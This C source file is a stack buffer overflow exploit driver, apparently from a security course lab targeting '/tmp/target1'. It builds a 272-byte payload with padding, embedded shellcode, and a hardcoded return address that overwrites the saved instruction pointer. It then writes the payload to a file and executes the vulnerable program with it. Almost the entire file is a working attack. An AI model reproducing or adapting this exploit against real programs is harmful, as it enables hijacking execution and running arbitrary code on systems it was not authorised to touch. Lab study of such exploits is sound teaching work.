#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define VULNERABLE_PROGRAM_PATH "/tmp/target1"
#define exploit_output_destination "/tmp/exploit_payload_file"

void inject_address(char *payload, size_t offset, u_int64_t address) {
    const size_t address_bytes = 8;
    
    for (size_t i = 0; i < address_bytes; ++i) {
        payload[offset + i] = (char)((address >> (i * 8)) & 0xff);
    }
}

int main(int argc, char *argv[])
{
    const size_t padding_to_rip = 264; 
    const size_t shellcode_data_len = sizeof(shellcode) - 1; 
    const size_t total_exploit_len = 272; 
    char payload_buffer[total_exploit_len];

    const u_int64_t redirect_address = 0x7fffffffdd68; 
    memset(payload_buffer, 0x42, padding_to_rip);

    inject_address(payload_buffer, padding_to_rip, redirect_address);
    
    const size_t shellcode_insert_pos = 40;
    memcpy(payload_buffer + shellcode_insert_pos, shellcode, shellcode_data_len);

    write_xploit(payload_buffer, total_exploit_len, exploit_output_destination);

    char *exec_args[] = { VULNERABLE_PROGRAM_PATH, exploit_output_destination, NULL };
    char *exec_env[] = { NULL };
    execve(VULNERABLE_PROGRAM_PATH, exec_args, exec_env);

    perror("execve failed.");
    fprintf(stderr, "check permissions or run \"sudo make install\"\n");

    return 0;
}
